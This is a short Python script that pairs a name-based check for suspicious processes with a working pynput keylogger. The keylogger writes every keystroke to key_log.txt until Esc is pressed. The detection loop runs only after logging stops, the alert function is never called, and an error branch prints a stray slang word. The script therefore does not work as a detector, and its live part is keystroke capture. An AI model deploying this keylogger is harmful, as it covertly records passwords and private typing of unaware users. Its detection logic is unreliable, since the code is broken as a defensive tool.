from pynput.keyboard import Key, Listener
import psutil
import os
import time
def check_for_suspicious_processes():
    suspicious_processes = ["keylogger", "logger", "spy", "hook"]
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            process_name = proc.info['name'].lower()
            for suspect in suspicious_processes:
                if suspect in process_name:
                    print(f"Suspicious Process Detected: {proc.info['name']} (PID: {proc.info['pid']})")
                    # Optionally, kill the process
                    # os.kill(proc.info['pid'], 9)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            print("louda")
            pass
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char} ')
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write("SPACE ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f' {key} ')

def on_release(key):
    if key == Key.esc:
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
def alert_user():
    print("ALERT: Suspicious Keylogging Activity Detected!")
    # Additional actions such as sending an email alert can be added here.

while True:
     check_for_suspicious_processes()